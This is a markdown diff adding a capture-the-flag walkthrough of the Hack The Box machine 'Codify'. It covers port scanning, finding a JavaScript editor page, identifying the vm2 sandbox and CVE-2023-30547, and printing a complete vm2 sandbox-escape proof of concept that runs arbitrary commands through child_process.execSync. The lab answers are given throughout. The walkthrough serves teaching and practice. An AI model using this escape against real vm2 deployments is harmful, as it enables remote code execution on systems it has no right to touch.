@@ -1,0 +1,79 @@
+# Codify
+---
+Task 1: Which is the highest open TCP port on Codify?
+- 3000  
+```nmap -A -T4 10.10.11.239```
+
+![alt text](../Images/Codify_nmap_results.png)
+
+Task 2: What is the relative path on the web application that offers a form to run JavaScript code?
+- /editor  
+```bash
+1. Go to http://10.10.11.239:3000
+2. Click on Try it now
+3. This takes you to http://10.10.11.239:3000/editor
+```
+
+Task 3: What is the name of the sandboxing library used by the application?
+- vm2  
+
+Check the About Us page
+
+Task 4: What is the 2023 CVE ID assigned to a remote code execution vulnerability in vm2 that was patched in version 3.9.17?
+- CVE-2023-30547
+
+1. Went to https://cve.mitre.org/cve/search_cve_list.html
+2. Searched for vm2
+
+![alt text](../Images/CVE-2023-30547.png)
+
+Task 5: What user is the web application running as?
+- svc
+
+1. Found the exploit using ```searchsploit vm2```
+``` bash
+------------------------------------------------------------- ---------------------------------
+ Exploit Title                                               |  Path
+------------------------------------------------------------- ---------------------------------
+vm2 - sandbox escape                                         | multiple/local/51898.c
+------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
+2. Found the file doing: ```bash locate multiple/local/51898.c
+/usr/share/exploitdb/exploits/multiple/local/51898.c```
+```bash
+const { VM } = require("vm2");
+const vm = new VM();
+
+const command = 'pwd'; // Change to the desired command
+
+const code = `
+async function fn() {
+    (function stack() {
+        new Error().stack;
+        stack();
+    })();
+}
+
+try {
+    const handler = {
+        getPrototypeOf(target) {
+            (function stack() {
+                new Error().stack;
+                stack();
+            })();
+        }
+    };
+
+    const proxiedErr = new Proxy({}, handler);
+
+    throw proxiedErr;
+} catch ({ constructor: c }) {
+    const childProcess = c.constructor('return process')().mainModule.require('child_process');
+    childProcess.execSync('${command}');
+}
+`;
+
+console.log(vm.run(code));
+```
+![alt text](../Images/PoC_vm2-escape.png)
